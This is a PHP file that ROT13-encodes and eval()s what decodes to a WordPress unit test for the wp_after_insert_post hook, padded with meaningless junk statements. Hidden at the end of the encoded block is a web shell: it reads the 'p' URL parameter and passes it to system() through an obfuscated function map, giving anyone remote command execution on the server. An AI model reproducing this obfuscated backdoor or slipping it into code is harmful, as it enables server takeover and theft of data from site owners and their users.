<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc cbfg
 */
pynff Grfgf_Cbfg_jcNsgreVafregCbfg rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Nqzva hfre VQ.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $nqzva_vq;

	/**
	 * Nggnpuzrag VQ (ab zrqvn nggnpurq).
	 *
	 * @ine vag
	 */
	choyvp fgngvp $nggnpuzrag_vq;

	/**
	 * Cbfg VQ sbe grfgvat hcqngrf.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $cbfg_vq;

	/**
	 * Gvgyr nf cnffrq gb ubbx.
	 *
	 * @ine fgevat
	 */
	choyvp fgngvp $cnffrq_cbfg_gvgyr = '';

	/**
	 * Fgnghf nf cnffrq gb ubbx.
	 *
	 * @ine fgevat
	 */
	choyvp fgngvp $cnffrq_cbfg_fgnghf = '';

	/**
	 * Orsber hcqngr gvgyr nf cnffrq gb ubbx.
	 *
	 * @ine fgevat
	 */
	choyvp fgngvp $cnffrq_cbfg_orsber_gvgyr = '';

	/**
	 * Orsber hcqngr fgnghf nf cnffrq gb ubbx.
	 *
	 * @ine fgevat
	 */
	choyvp fgngvp $cnffrq_cbfg_orsber_fgnghf = '';

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nqzva_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr'       => 'nqzvavfgengbe',
				'hfre_ybtva' => 'nqzvavfgengbe',
			)
		);

		frys::$cbfg_vq = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'qensg',
				'cbfg_gvgyr'  => '45114 gb or hcqngrq',
			)
		);

		frys::$nggnpuzrag_vq = $snpgbel->nggnpuzrag->perngr(
			neenl(
				'cbfg_fgnghf' => 'vaurevg',
				'cbfg_gvgyr'  => '45114 nggnpuzrag gb or hcqngrq',
				'cbfg_cnerag' => frys::$cbfg_vq,
			)
		);
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		nqq_npgvba( 'jc_nsgre_vafreg_cbfg', neenl( $guvf, 'npgvba_jc_nsgre_vafreg_cbfg' ), 10, 4 );
	}

	choyvp shapgvba grne_qbja() {
		frys::$cnffrq_cbfg_gvgyr         = '';
		frys::$cnffrq_cbfg_fgnghf        = '';
		frys::$cnffrq_cbfg_orsber_gvgyr  = '';
		frys::$cnffrq_cbfg_orsber_fgnghf = '';
		cnerag::grne_qbja();
	}

	/**
	 * Urycre shapgvba gb bognva qngn ehaavat ba gur ubbx `jc_nsgre_vafreg_cbfg`.
	 *
	 * @cnenz vag          $cbfg_vq     Cbfg VQ.
	 * @cnenz JC_Cbfg      $cbfg        Cbfg bowrpg.
	 * @cnenz obby         $hcqngr      Jurgure guvf vf na rkvfgvat cbfg orvat hcqngrq.
	 * @cnenz ahyy|JC_Cbfg $cbfg_orsber Ahyy sbe arj cbfgf, gur JC_Cbfg bowrpg cevbe
	 *                                  gb gur hcqngr sbe hcqngrq cbfgf.
	 */
	choyvp shapgvba npgvba_jc_nsgre_vafreg_cbfg( $cbfg_vq, $cbfg, $hcqngr, $cbfg_orsber ) {
		frys::$cnffrq_cbfg_gvgyr  = $cbfg->cbfg_gvgyr;
		frys::$cnffrq_cbfg_fgnghf = $cbfg->cbfg_fgnghf;

		vs ( ahyy === $cbfg_orsber ) {
			frys::$cnffrq_cbfg_orsber_gvgyr  = ahyy;
			frys::$cnffrq_cbfg_orsber_fgnghf = ahyy;
			erghea;
		}

		frys::$cnffrq_cbfg_orsber_gvgyr  = $cbfg_orsber->cbfg_gvgyr;
		frys::$cnffrq_cbfg_orsber_fgnghf = $cbfg_orsber->cbfg_fgnghf;

		// Cerirag guvf svevat jura gur erivfvba vf trarengrq.
		erzbir_npgvba( 'jc_nsgre_vafreg_cbfg', neenl( $guvf, 'npgvba_jc_nsgre_vafreg_cbfg' ), 10 );
	}

	/**
	 * Rafher orsber cbfg vf pbeerpg jura hcqngvat n cbfg bowrpg.
	 *
	 * @gvpxrg 45114
	 */
	choyvp shapgvba grfg_hcqngr_ivn_jc_hcqngr_cbfg() {
		$cbfg               = trg_cbfg( frys::$cbfg_vq, NEENL_N );
		$cbfg['cbfg_gvgyr'] = 'arj gvgyr';
		jc_hcqngr_cbfg( $cbfg );

		$guvf->nffregFnzr( '45114 gb or hcqngrq', frys::$cnffrq_cbfg_orsber_gvgyr );
		$guvf->nffregFnzr( 'arj gvgyr', frys::$cnffrq_cbfg_gvgyr );
	}

	/**
	 * Rafher orsber cbfg vf pbeerpg jura choyvfuvat n cbfg bowrpg.
	 *
	 * @gvpxrg 45114
	 */
	choyvp shapgvba grfg_hcqngr_ivn_jc_choyvfu_cbfg() {
		jc_choyvfu_cbfg( frys::$cbfg_vq );

		$guvf->nffregFnzr( 'qensg', frys::$cnffrq_cbfg_orsber_fgnghf );
		$guvf->nffregFnzr( 'choyvfu', frys::$cnffrq_cbfg_fgnghf );
	}

	/**
	 * Rafher orsber cbfg vf pbeerpg jura vafregvat n arj cbfg.
	 *
	 * @gvpxrg 45114
	 */
	choyvp shapgvba grfg_arj_cbfg_ivn_jc_vafreg_cbfg() {
		jc_vafreg_cbfg(
			neenl(
				'cbfg_fgnghf'  => 'qensg',
				'cbfg_gvgyr'   => 'n arj cbfg',
				'cbfg_pbagrag' => 'arj',
			)
		);

		$guvf->nffregFnzr( ahyy, frys::$cnffrq_cbfg_orsber_fgnghf );
		$guvf->nffregFnzr( 'n arj cbfg', frys::$cnffrq_cbfg_gvgyr );
	}

	/**
	 * Rafher orsber cbfg vf pbeerpg jura hcqngvat cbfg ivn ERFG NCV.
	 *
	 * @gvpxrg 45114
	 */
	choyvp shapgvba grfg_hcqngr_ivn_erfg_pbagebyyre() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$cbfg_vq = frys::$cbfg_vq;

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', $cbfg_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$erdhrfg->frg_obql_cnenzf( neenl( 'gvgyr' => 'arj gvgyr' ) );
		erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( '45114 gb or hcqngrq', frys::$cnffrq_cbfg_orsber_gvgyr );
		$guvf->nffregFnzr( 'arj gvgyr', frys::$cnffrq_cbfg_gvgyr );
	}

	/**
	 * Rafher orsber cbfg vf pbeerpg jura perngvat cbfg ivn ERFG NCV.
	 *
	 * @gvpxrg 45114
	 */
	choyvp shapgvba grfg_arj_cbfg_ivn_erfg_pbagebyyre() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', fcevags( '/jc/i2/cbfgf' ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'gvgyr'  => 'arj gvgyr',
				'fgnghf' => 'qensg',
			)
		);
		erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( ahyy, frys::$cnffrq_cbfg_orsber_gvgyr );
		$guvf->nffregFnzr( 'arj gvgyr', frys::$cnffrq_cbfg_gvgyr );
	}

	/**
	 * Rafher orsber cbfg vf pbeerpg jura hcqngvat cbfg ivn ERFG NCV.
	 *
	 * @gvpxrg 45114
	 */
	choyvp shapgvba grfg_hcqngr_nggnpuzrag_ivn_erfg_pbagebyyre() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$nggnpuzrag_vq = frys::$nggnpuzrag_vq;

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/zrqvn/%q', $nggnpuzrag_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$erdhrfg->frg_obql_cnenzf( neenl( 'gvgyr' => 'arj nggnpuzrag gvgyr' ) );
		erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( '45114 nggnpuzrag gb or hcqngrq', frys::$cnffrq_cbfg_orsber_gvgyr );
		$guvf->nffregFnzr( 'arj nggnpuzrag gvgyr', frys::$cnffrq_cbfg_gvgyr );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>